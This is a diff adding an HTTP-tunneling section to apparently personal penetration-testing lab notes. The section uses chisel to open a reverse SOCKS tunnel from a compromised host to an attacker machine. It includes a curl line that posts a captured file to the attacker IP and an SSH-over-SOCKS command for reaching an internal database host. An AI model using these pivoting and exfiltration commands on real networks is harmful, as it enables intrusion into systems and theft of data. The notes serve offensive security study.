@@ -282,3 +282,16 @@ On Windows:
         Delete the rule and port forward after done:
             netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
             netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+
+HTTP Tunneling:
+    Chisel: Get chisel on both compromised and local
+    local:
+    if error use: https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz 
+    
+        chisel server --port 8080 --reverse (on local)
+        sudo tcpdump -nvvvXi tun0 tcp port 8080 (log incoming traffic)
+    on client:
+        /tmp/chisel client 192.168.45.225:8080 R:socks > /dev/null 2>&1 &
+        /tmp/chisel client 192.168.45.225:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.225:8080/
+    and to connect with ncat use this on our kali:
+        ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.243.215
